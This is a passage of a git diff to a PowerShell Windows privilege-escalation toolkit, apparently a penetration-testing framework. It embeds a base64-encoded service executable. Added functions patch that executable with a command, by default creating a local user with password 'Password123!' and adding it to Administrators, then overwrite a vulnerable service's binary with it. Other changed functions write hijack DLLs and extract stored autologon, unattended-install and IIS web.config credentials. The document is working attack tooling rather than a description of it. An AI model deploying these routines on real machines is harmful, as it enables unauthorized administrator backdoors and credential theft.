gACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAA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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAAwAAAAgOgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)
+    }
+
+    process {
+        if(-not $Command) {
+            if($UserName.Contains("\")) {
+                # adding a domain user to the local group, no creation
+                $Command = "net localgroup $LocalGroup $UserName /add"
+            }
+            else {
+                # creating a local user and adding to the local group
+                $Command = "net user $UserName $Password /add && timeout /t 2 && net localgroup $LocalGroup $UserName /add"
+            }
+        }
+
+        # get the unicode byte conversions of all arguments
+        $Enc = [System.Text.Encoding]::Unicode
+        $ServiceNameBytes = $Enc.GetBytes($ServiceName)
+        $CommandBytes = $Enc.GetBytes($Command)
+
+        # patch all values in to their appropriate locations
+        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) { 
+            # service name offset = 2458
+            $Binary[$i+2458] = $ServiceNameBytes[$i]
+        }
+        for ($i=0; $i -lt ($CommandBytes.Length); $i++) { 
+            # cmd offset = 2535
+            $Binary[$i+2535] = $CommandBytes[$i]
+        }
+
+        try {
+            Set-Content -Value $Binary -Encoding Byte -Path $ServicePath -Force
+        }
+        catch {
+            $Msg = "Error while writing to location '$ServicePath': $_"
+            Write-Warning $Msg
+            $Command = $Msg
+        }
+
+        $Out = New-Object PSObject
+        $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
+        $Out | Add-Member Noteproperty 'Command' $Command
+        $Out
+    }
+}
+
+
+function Install-ServiceBinary {
+<#
+    .SYNOPSIS
+
+        Users Write-ServiceBinary to write a C# service that creates a local UserName
+        and adds it to specified LocalGroup or executes a custom command.
+        Domain users are only added to the specified LocalGroup.
+
+    .PARAMETER ServiceName
+
+        The service name to manipulate. Required.
+
+    .PARAMETER UserName
+
+        The [DOMAIN\username] to add, defaults to 'john'.
+
+    .PARAMETER Password
+
+        The password to set for the added user, default to 'Password123!'.
+
+    .PARAMETER LocalGroup
+
+        Local group to add the user to, defaults to 'Administrators'.
+
+    .PARAMETER Command
+
+        A custom command to execute.
+
+    .EXAMPLE
+
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC
+
+        Replaces the binary for VulnSVC with one that adds a local administrator
+        to the local directory. Also backs up the original service binary.
+
+    .EXAMPLE
+
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName "TESTLAB\john"
+
+        Replaces the binary for VulnSVC with one that adds TESTLAB\john to the local
+        administrators to the local directory. Also backs up the original service binary.
+
+    .EXAMPLE
+
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -UserName backdoor -Password Password123!
+
+        Replaces the binary for VulnSVC with one that adds a local administrator of
+        name 'backdoor' with password 'Password123!' to the local directory.
+        Also backs up the original service binary.
+
+    .EXAMPLE
+
+        PS C:\> Install-ServiceBinary -ServiceName VulnSVC -Command "net ..."
+
+        Replaces the binary for VulnSVC with one that executes a local command
+        to the local directory. Also backs up the original service binary.
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName,
+
+        [String]
+        $UserName = "john",
+
+        [String]
+        $Password = "Password123!",
+
+        [String]
+        $LocalGroup = "Administrators",
+
+        [String]
+        $Command
+    )
+
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
+
+        # make sure we got a result back
+        if ($TargetService){
+            try {
+
+                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
+                $BackupPath = $ServicePath + ".bak"
+
+                Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"
+                try {
+                    Move-Item -Path $ServicePath -Destination $BackupPath -Force
+                }
+                catch {
+                    Write-Warning "[*] Original path '$ServicePath' for '$ServiceName' does not exist!"
+                }
+
+                $Arguments = @{
+                    'ServiceName' = $ServiceName
+                    'ServicePath' = $ServicePath
+                    'UserName' = $UserName
+                    'Password' = $Password
+                    'LocalGroup' = $LocalGroup
+                    'Command' = $Command
+                }
+                # splat the appropriate arguments to Write-ServiceBinary
+                $Result = Write-ServiceBinary @Arguments
+                $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
+                $Result
+            }
+            catch {
+                Write-Warning "Error: $_"
+                $Out = New-Object PSObject
+                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
+                $Out | Add-Member Noteproperty 'Command' $_
+                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
+                $Out
+            }
+        }
+        else{
+            Write-Warning "Target service '$ServiceName' not found on the machine"
+            $Out = New-Object PSObject
+            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
+            $Out | Add-Member Noteproperty 'Command' $Null
+            $Out | Add-Member Noteproperty 'BackupPath' $Null
+            $Out
+        }
+    }
+}
+
+
+function Restore-ServiceBinary {
+<#
+    .SYNOPSIS
+
+        Copies in the backup executable to the original binary path for a service.
+
+    .PARAMETER ServiceName
+
+        The service name to manipulate. Required.
+  
+    .PARAMETER BackupPath
+
+        Optional manual path to the backup binary.
+        
+    .EXAMPLE
+
+        PS C:\> Restore-ServiceBinary -ServiceName VulnSVC
+
+        Restore the original binary for the service 'VulnSVC'
+#>
+
+    [CmdletBinding()]
+    Param(
+        [Parameter(ValueFromPipeline=$True, Mandatory = $True)]
+        [String]
+        $ServiceName,
+
+        [String]
+        $BackupPath
+    )
+
+    process {
+        # query WMI for the service
+        $TargetService = Get-WmiObject -Class win32_service -Filter "Name='$ServiceName'" | Where-Object {$_}
+
+        # make sure we got a result back
+        if ($TargetService){
+            try {
+
+                $ServicePath = ($TargetService.PathName.Substring(0, $TargetService.PathName.IndexOf(".exe") + 4)).Replace('"',"")
+
+                if ($BackupPath -eq $null -or $BackupPath -eq ''){
+                    $BackupPath = $ServicePath + ".bak"
+                }
+
+                Copy-Item -Path $BackupPath -Destination $ServicePath -Force
+                Remove-Item -Path $BackupPath -Force
+
+                $Out = New-Object PSObject
+                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+                $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
+                $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
+                $Out
+            }
+            catch{
+                Write-Warning "Error: $_"
+                $Out = New-Object PSObject
+                $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+                $Out | Add-Member Noteproperty 'ServicePath' $_
+                $Out | Add-Member Noteproperty 'BackupPath' $Null
+                $Out
+            }
+        }
+        else{
+            Write-Warning "Target service '$ServiceName' not found on the machine"
+            $Out = New-Object PSObject
+            $Out | Add-Member Noteproperty 'ServiceName' $ServiceName
+            $Out | Add-Member Noteproperty 'ServicePath' "Not found"
+            $Out | Add-Member Noteproperty 'BackupPath' $Null
+            $Out
+        }
     }
 }
 
@@ -1308,9 +1000,8 @@ function Find-DLLHijack {
 <#
     .SYNOPSIS
 
-        This function checks all loaded modules for each process, and
-        returns locations where a loaded module does not exist
-        in the executable base path.
+        Checks all loaded modules for each process and returns locations 
+        where a loaded module does not exist in the executable base path.
 
     .PARAMETER ExcludeWindows
 
@@ -1431,8 +1122,8 @@ function Find-PathHijack {
 <#
     .SYNOPSIS
 
-        This function first checks if the current %PATH% has 
-        any directories that are writeable by the current user.
+        Checks if the current %PATH% has any directories that are 
+        writeable by the current user.
 
     .EXAMPLE
 
@@ -1441,6 +1132,7 @@ function Find-PathHijack {
         Finds all %PATH% .DLL hijacking opportunities.
 
     .LINK
+
         http://www.greyhathacker.net/?p=738
 #>
 
@@ -1466,9 +1158,13 @@ function Find-PathHijack {
         if(-not $(Test-Path -Path $Path)){
             try {
                 # try to create the folder
-                New-Item -ItemType directory -Path $Path | Out-Null
+                $Null = New-Item -ItemType directory -Path $Path
                 echo $Null > $TestPath
-                $Path
+
+                $Out = New-Object PSObject 
+                $Out | Add-Member Noteproperty 'HijackablePath' $Path
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
+                $Out
             }
             catch {}
             finally {
@@ -1480,7 +1176,11 @@ function Find-PathHijack {
             # if the folder already exists
             try {
                 echo $Null > $TestPath
-                $Path
+
+                $Out = New-Object PSObject 
+                $Out | Add-Member Noteproperty 'HijackablePath' $Path
+                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
+                $Out
             }
             catch {} 
             finally {
@@ -1522,17 +1222,17 @@ function Write-HijackDll {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory = $True)]
-        [string]
+        [String]
         $OutputFile,
 
         [Parameter(Mandatory = $True)]
-        [string]
+        [String]
         $Command,
 
-        [string]
+        [String]
         $BatPath,        
 
-        [string]
+        [String]
         $Arch
     )
 
@@ -1562,11 +1262,11 @@ function Write-HijackDll {
             $DllBytes,
 
             [Parameter(Mandatory = $True)]
-            [string]
+            [String]
             $FindString,
 
             [Parameter(Mandatory = $True)]
-            [string]
+            [String]
             $ReplaceString
         )
 
@@ -1607,7 +1307,7 @@ function Write-HijackDll {
     }
     else {
         # if no architecture if specified, try to auto-determine the arch
-        if ($env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
+        if ($Env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
             [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
             $Arch = "x64"
         }
@@ -1636,6 +1336,13 @@ function Write-HijackDll {
 
     Set-Content -Value $DllBytes -Encoding Byte -Path $OutputFile
     "$Arch DLL Hijacker written to: $OutputFile"
+
+    $Out = New-Object PSObject 
+    $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
+    $Out | Add-Member Noteproperty 'Architecture' $Arch
+    $Out | Add-Member Noteproperty 'BATLauncherPath' $BatPath
+    $Out | Add-Member Noteproperty 'Command' $Command
+    $Out
 }
 
 
@@ -1649,8 +1356,8 @@ function Get-RegAlwaysInstallElevated {
 <#
     .SYNOPSIS
 
-        This function checks if the AlwaysInstallElevated registry key
-        is set, meaing that MSI files are always run with SYSTEM
+        Checks if the AlwaysInstallElevated registry key is set.
+        This meains that MSI files are always run with SYSTEM
         level privileges.
 
     .EXAMPLE
@@ -1703,8 +1410,8 @@ function Get-RegAutoLogon {
 <#
     .SYNOPSIS
 
-        This function checks for DefaultUserName/DefaultPassword in
-        the Winlogin registry section if the AutoAdminLogon key is set.
+        Checks for DefaultUserName/DefaultPassword in the Winlogin registry section 
+        if the AutoAdminLogon key is set.
 
     .EXAMPLE
 
@@ -1728,21 +1435,15 @@ function Get-RegAutoLogon {
         $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
         $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
         $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
-
-        if ($DefaultUserName) {            
-            $Out = New-Object PSObject 
-            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
-            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
-            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
-            $Out
-        }
-
         $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
         $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
         $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword
 
-        if ($AltDefaultUserName) {
+        if ($DefaultUserName -or $AltDefaultUserName) {            
             $Out = New-Object PSObject 
+            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
+            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
+            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
             $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
             $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
             $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
@@ -1864,13 +1565,13 @@ function Get-UnattendedInstallFile {
 <#
     .SYNOPSIS
 
-        This function checks four locations for remaining
-        unattended installation files, which may have 
-        deployment credentials.
+        Checks several locations for remaining unattended installation files, 
+        which may have deployment credentials.
 
     .EXAMPLE
 
         PS C:\> Get-UnattendedInstallFile
+
         Finds any remaining unattended installation files.
 
     .LINK
@@ -1893,7 +1594,11 @@ function Get-UnattendedInstallFile {
                         )
 
     # test the existence of each path and return anything found
-    $SearchLocations | Where-Object { Test-Path $_ }
+    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
+        $Out = New-Object PSObject 
+        $Out | Add-Member Noteproperty 'UnattendPath' $_
+        $Out
+    }
 
     $ErrorActionPreference = $OrigError
 }
@@ -1970,17 +1675,17 @@ function Get-Webconfig {
     $ErrorActionPreference = "SilentlyContinue"
 
     # Check if appcmd.exe exists
-    if (Test-Path  ("$env:SystemRoot\System32\InetSRV\appcmd.exe")) {
+    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
         # Create data table to house results
         $DataTable = New-Object System.Data.DataTable 
 
         # Create and name columns in the data table
-        $DataTable.Columns.Add("user") | Out-Null
-        $DataTable.Columns.Add("pass") | Out-Null  
-        $DataTable.Columns.Add("dbserv") | Out-Null
-        $DataTable.Columns.Add("vdir") | Out-Null
-        $DataTable.Columns.Add("path") | Out-Null
-        $DataTable.Columns.Add("encr") | Out-Null
+        $Null = $DataTable.Columns.Add("user")
+        $Null = $DataTable.Columns.Add("pass")  
+        $Null = $DataTable.Columns.Add("dbserv")
+        $Null = $DataTable.Columns.Add("vdir")
+        $Null = $DataTable.Columns.Add("path")
+        $Null = $DataTable.Columns.Add("encr")
 
         # Get list of virtual directories in IIS 
         C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
@@ -1990,7 +1695,7 @@ function Get-Webconfig {
 
             # Converts CMD style env vars (%) to powershell env vars (env)
             if ($_ -like "*%*") {            
-                $EnvarName = "`$env:"+$_.split("%")[1]
+                $EnvarName = "`$Env:"+$_.split("%")[1]
                 $EnvarValue = Invoke-Expression $EnvarName
                 $RestofPath = $_.split("%")[2]            
                 $CurrentVdir  = $EnvarValue+$RestofPath
@@ -2012,7 +1717,7 @@ function Get-Webconfig {
                     $ConfigFile.configuration.connectionStrings.add| 
                     ForEach-Object {
 
-                        [string]$MyConString = $_.connectionString
+                        [String]$MyConString = $_.connectionString
                         if($MyConString -like "*password*") {
                             $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                             $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
@@ -2034,7 +1739,7 @@ function Get-Webconfig {
                     if (Test-Path  ($aspnet_regiis_path.FullName)){
 
                         # Setup path for temp web.config to the current user's temp dir
-                        $WebConfigPath = (get-item $env:temp).FullName + "\web.config"
+                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"
 
                         # Remove existing temp web.config
                         if (Test-Path  ($WebConfigPath)) 
@@ -2046,8 +1751,8 @@ function Get-Webconfig {
                         Copy-Item $CurrentPath $WebConfigPath
 
                         #Decrypt web.config in user temp                 
-                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $env:temp).FullName'
-                        Invoke-Expression $aspnet_regiis_cmd | Out-Null
+                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
+                        $Null = Invoke-Expression $aspnet_regiis_cmd
 
                         # Read the data from the web.config in temp
                         [xml]$TMPConfigFile = Get-Content $WebConfigPath
@@ -2059,7 +1764,7 @@ function Get-Webconfig {
                             # Foreach connection string add to data table
                             $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {
 
-                                [string]$MyConString = $_.connectionString
+                                [String]$MyConString = $_.connectionString
                                 if($MyConString -like "*password*") {
                                     $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                     $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
@@ -2176,59 +1881,59 @@ function Get-ApplicationHost {
     $ErrorActionPreference = "SilentlyContinue"
 
     # Check if appcmd.exe exists
-    if (Test-Path  ("$env:SystemRoot\System32\inetsrv\appcmd.exe"))
+    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe"))
     {
